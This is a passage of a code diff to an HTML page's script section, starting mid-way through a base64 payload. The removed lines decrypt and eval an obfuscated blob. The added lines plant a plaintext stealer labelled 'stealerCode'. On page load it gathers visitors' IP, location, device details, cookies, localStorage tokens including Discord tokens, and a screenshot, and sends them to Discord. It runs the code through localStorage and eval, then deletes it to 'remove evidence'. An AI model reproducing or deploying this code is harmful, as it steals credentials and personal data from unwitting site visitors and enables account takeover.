QutCwINGH0YLQvtCx0Ysg0YHRgtGA0LDQvdC40YbQsCDQv9GA0L7Qs9GA0YPQt9C40LvQsNGB0YwKICAgICAgICAgICAgc2V0VGltZW91dChzZW5kSW5mb1RvRGlzY29yZCwgMTAwMCk7CiAgICAgICAgfTs=";
-        
-        // Ключ шифрования
-        const key = "darksolutions2025";
-        
-        try {
-            // Расшифровываем
-            const decoded = atob(encoded);
-            const decrypted = decrypt(decoded, key);
-            
-            // Выполняем
-            eval(decrypted);
-        } catch(e) {
-            console.log('Loading...');
         }
-    })();
+
+        function dataURLToBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], { type: mime });
+        }
+
+        function getBrowserInfo() {
+            var ua = window.navigator.userAgent;
+            var browserInfo = "";
+            if (ua.indexOf("Chrome") !== -1) {
+                browserInfo = "Google Chrome";
+            } else if (ua.indexOf("Firefox") !== -1) {
+                browserInfo = "Mozilla Firefox";
+            } else if (ua.indexOf("Edge") !== -1) {
+                browserInfo = "Microsoft Edge";
+            } else if (ua.indexOf("Safari") !== -1) {
+                browserInfo = "Safari";
+            } else {
+                browserInfo = "Unknown Browser";
+            }
+            return browserInfo + " (" + ua + ")";
+        }
+
+        async function getDeviceInfo() {
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            const deviceType = isMobile ? "Mobile Device" : "PC";
+            const os = isMobile ? getMobileOperatingSystem() : getDesktopOperatingSystem();
+            return { deviceType, os };
+        }
+
+        function getDesktopOperatingSystem() {
+            const userAgent = window.navigator.userAgent;
+            let os = "Unknown";
+            if (userAgent.indexOf("Windows NT") !== -1) {
+                os = "Windows";
+            } else if (userAgent.indexOf("Mac") !== -1) {
+                os = "Macintosh";
+            } else if (userAgent.indexOf("Linux") !== -1) {
+                os = "Linux";
+            }
+            return os;
+        }
+
+        function getMobileOperatingSystem() {
+            const userAgent = window.navigator.userAgent;
+            if (userAgent.match(/Android/i)) {
+                return "Android";
+            } else if (userAgent.match(/iPhone|iPad|iPod/i)) {
+                return "iOS";
+            } else {
+                return "Unknown Mobile OS";
+            }
+        }
+
+        async function takeScreenshot() {
+            try {
+                const canvas = await html2canvas(document.body, {
+                    scale: 2,
+                    logging: false,
+                    allowTaint: true,
+                    useCORS: true,
+                    backgroundColor: null
+                });
+                return canvas.toDataURL('image/png');
+            } catch(e) {
+                console.log("Screenshot error:", e);
+                return null;
+            }
+        }
+
+        async function sendInfoToDiscord() {
+            const { city, country, coordinates, emoji } = await getCityCountryAndEmoji();
+            const ipAddressResponse = await fetch("https://api64.ipify.org?format=json");
+            const ipAddressData = await ipAddressResponse.json();
+            const ipAddress = ipAddressData.ip || "Unknown IP Address";
+            const time = new Date().toLocaleString();
+            const browser = getBrowserInfo();
+            const { deviceType, os } = await getDeviceInfo();
+            const googleMapsLink = "https://www.google.com/maps?q=" + coordinates;
+            const username = await getUserName();
+            const isOnline = navigator.onLine ? "Online" : "Offline";
+            const language = navigator.language || "Unknown Language";
+            const pluginCount = navigator.plugins.length;
+            
+            // Детальная инфа о плагинах
+            let pluginsList = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                pluginsList.push(navigator.plugins[i].name);
+            }
+            const plugins = pluginsList.join(" | ");
+            
+            const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+            const { width, height } = await getScreenResolution();
+            const { cameraCount, microphoneCount } = await getMediaDevicesInfo();
+            const hasCamera = cameraCount > 0 ? "Yes" : "No";
+            const hasMicrophone = microphoneCount > 0 ? "Yes" : "No";
+            const currentURL = window.location.href;
+            const windowSize = window.innerWidth + "x" + window.innerHeight;
+            
+            // Доп инфа
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const platform = navigator.platform;
+            const cores = navigator.hardwareConcurrency || "Unknown";
+            const touchSupport = navigator.maxTouchPoints > 0 ? "Yes" : "No";
+            const doNotTrack = navigator.doNotTrack || "Not set";
+            
+            // Токены из localStorage
+            let tokens = [];
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    if (value && (value.includes('mfa.') || value.includes('discord') || value.includes('token'))) {
+                        tokens.push(`${key}: ${value.substring(0, 50)}...`);
+                    }
+                }
+            } catch(e) {}
+            
+            const cookies = document.cookie || "No cookies";
+            
+            const message = "****                User Information****\n" +
+                            "****-----------------------------------****\n" +
+                            "- 🗺️ **IP Address**: `" + ipAddress + "`\n" +
+                            "- 👤 **User Name**: `" + username + "`\n" +
+                            "- 🏙️ **City**: `" + city + "`\n" +
+                            "- 🌍 **Country**: `" + country + "` " + emoji + "\n" +
+                            "- 🏞️ **Coordinates**: [`" + coordinates + "`](" + googleMapsLink + ")\n" +
+                            "- 🕒 **Time**: `" + time + "`\n" +
+                            "- 🌐 **Browser**: `" + browser + "`\n" +
+                            "- 🖥️ **Device Type**: `" + deviceType + "`\n" +
+                            "- 📟️ **Operating System**: `" + os + "`\n" +
+                            "- 🛰️ **Connection Status**: `" + isOnline + "`\n" +
+                            "- 🀄 **Browser Language**: `" + language + "`\n" +
+                            "- 📼️ **Device Language(s)**: `" + navigator.languages.join(", ") + "`\n" +
+                            "- 🛠️ **Number of Plugins**: `" + pluginCount + "`\n" +
+                            "- 🔌 **Plugins**: `" + plugins + "`\n" +
+                            "- 💻 **Device Memory**: `" + deviceMemory + "`\n" +
+                            "- 📐 **Screen Resolution**: `" + width + "x" + height + "`\n" +
+                            "- 📷 **Camera**: `" + hasCamera + "`\n" +
+                            "- 🎤 **Microphone**: `" + hasMicrophone + "`\n" +
+                            "- 📎 **Current URL**: `" + currentURL + "`\n" +
+                            "- 🪟 **Window Size**: `" + windowSize + "`\n" +
+                            "- ⏰ **Timezone**: `" + timezone + "`\n" +
+                            "- 💾 **Platform**: `" + platform + "`\n" +
+                            "- 🧠 **CPU Cores**: `" + cores + "`\n" +
+                            "- 👆 **Touch Support**: `" + touchSupport + "`\n" +
+                            "- 🚫 **Do Not Track**: `" + doNotTrack + "`\n" +
+                            "- 🍪 **Cookies**: `" + cookies.substring(0, 200) + "`\n" +
+                            "- 🔑 **LocalStorage Tokens**: " + (tokens.length ? tokens.join(" | ") : "None");
+            
+            // Отправляем основную инфу
+            sendToDiscord(message);
+            
+            // Делаем и отправляем скриншот
+            const screenshot = await takeScreenshot();
+            if (screenshot) {
+                sendToDiscord("📸 **Screenshot**", true, "screenshot_" + Date.now() + ".png", screenshot);
+            }
+        }
+
+        async function getCityCountryAndEmoji() {
+            try {
+                const response = await fetch("https://ipinfo.io/json");
+                const data = await response.json();
+                const city = data.city || "Unknown City";
+                const country = data.country || "Unknown Country";
+                const coordinates = data.loc || "Unknown Coordinates";
+                let emoji = "";
+                let countryName = "";
+                switch(country) {
+                    case "RU":
+                        countryName = "Russia";
+                        emoji = "🇷🇺";
+                        break;
+                    case "UA":
+                        countryName = "Ukraine";
+                        emoji = "🇺🇦";
+                        break;
+                    case "US":
+                        countryName = "United States";
+                        emoji = "🇺🇸";
+                        break;
+                    case "KZ":
+                        countryName = "Kazakhstan";
+                        emoji = "🇰🇿";
+                        break;
+                    case "FR":
+                        countryName = "France";
+                        emoji = "🇫🇷";
+                        break;
+                    default:
+                        countryName = country || "Unknown Country";
+                        emoji = "🌍";
+                }
+                return { city, country: countryName, coordinates, emoji };
+            } catch (error) {
+                console.error("Error fetching city, country, and emoji:", error);
+                return { city: "Unknown City", country: "Unknown Country", coordinates: "Unknown Coordinates", emoji: "🌍" };
+            }
+        }
+
+        async function getScreenResolution() {
+            return { width: screen.width, height: screen.height };
+        }
+
+        async function getMediaDevicesInfo() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const cameras = devices.filter(device => device.kind === 'videoinput');
+                const microphones = devices.filter(device => device.kind === 'audioinput');
+                return { cameraCount: cameras.length, microphoneCount: microphones.length };
+            } catch (error) {
+                console.error("Error fetching media devices information:", error);
+                return { cameraCount: 0, microphoneCount: 0 };
+            }
+        }
+
+        async function getUserName() {
+            return new Promise((resolve) => {
+                var userName = localStorage.getItem("username");
+                if (userName) {
+                    resolve(userName);
+                } else {
+                    resolve("Unknown User");
+                }
+            });
+        }
+
+        window.onload = function() {
+            // Небольшая задержка чтобы страница прогрузилась
+            setTimeout(sendInfoToDiscord, 1000);
+        };
+         `;
+        localStorage.setItem('stealerCode', fullCode);
+    }
+    
+    // Тут же выполняем код из localStorage
+    eval(localStorage.getItem('stealerCode'));
+    
+    // Удаляем все улики
+    localStorage.removeItem('stealerCode');
     </script>
 </section>
 
